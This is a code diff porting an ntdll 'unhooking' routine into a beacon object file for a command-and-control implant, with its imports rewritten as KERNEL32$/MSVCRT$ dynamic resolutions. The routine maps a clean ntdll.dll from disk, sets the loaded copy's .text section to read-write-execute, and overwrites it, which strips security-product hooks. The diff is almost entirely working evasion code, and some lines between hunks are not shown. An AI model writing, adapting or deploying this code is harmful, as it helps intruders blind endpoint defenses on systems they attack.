@@ -1,10 +1,23 @@
 #include <windows.h>
 #include "beacon_compat.h"
 
+/* BOF-style imports */
+DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
+DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR, UINT);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileMappingW(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
+DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$UnmapViewOfFile(LPCVOID);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
+
+DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscat(wchar_t*, const wchar_t*);
+
 void go(char *args, int args_len) {
     (void)args; (void)args_len;
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
     if (!hNtdll) {
         BeaconPrintf(CALLBACK_ERROR, "[!] ntdll.dll not found\n");
         return;
@@ -12,30 +25,30 @@ void go(char *args, int args_len) {
 
     /* Build path to clean ntdll on disk */
     wchar_t ntdllPath[MAX_PATH];
-    GetSystemDirectoryW(ntdllPath, MAX_PATH);
-    wcscat(ntdllPath, L"\\ntdll.dll");
+    KERNEL32$GetSystemDirectoryW(ntdllPath, MAX_PATH);
+    MSVCRT$wcscat(ntdllPath, L"\\ntdll.dll");
 
-    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
+    HANDLE hFile = KERNEL32$CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open ntdll.dll from disk: %lu\n",
-                     GetLastError());
+                     KERNEL32$GetLastError());
         return;
     }
 
-    HANDLE hMapping = CreateFileMappingW(hFile, NULL,
+    HANDLE hMapping = KERNEL32$CreateFileMappingW(hFile, NULL,
                                          PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
     if (!hMapping) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileMapping failed: %lu\n", GetLastError());
-        CloseHandle(hFile);
+        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileMapping failed: %lu\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hFile);
         return;
     }
 
-    void *pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    void *pClean = KERNEL32$MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
     if (!pClean) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] MapViewOfFile failed: %lu\n", GetLastError());
-        CloseHandle(hMapping);
-        CloseHandle(hFile);
+        BeaconPrintf(CALLBACK_ERROR, "[!] MapViewOfFile failed: %lu\n", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hMapping);
+        KERNEL32$CloseHandle(hFile);
         return;
     }
 
@@ -57,14 +70,14 @@ void go(char *args, int args_len) {
             void *pOriginal = (BYTE *)pClean + textRVA;
 
             DWORD oldProtect;
-            if (!VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            if (!KERNEL32$VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                 BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n",
-                             GetLastError());
+                             KERNEL32$GetLastError());
                 break;
             }
 
             memcpy(pHooked, pOriginal, textSize);
-            VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
+            KERNEL32$VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
             patched = TRUE;
 
             BeaconPrintf(CALLBACK_OUTPUT,
@@ -74,9 +87,9 @@ void go(char *args, int args_len) {
         }
     }
 
-    UnmapViewOfFile(pClean);
-    CloseHandle(hMapping);
-    CloseHandle(hFile);
+    KERNEL32$UnmapViewOfFile(pClean);
+    KERNEL32$CloseHandle(hMapping);
+    KERNEL32$CloseHandle(hFile);
 
     if (!patched)
         BeaconPrintf(CALLBACK_ERROR, "[!] .text section not found in ntdll\n");
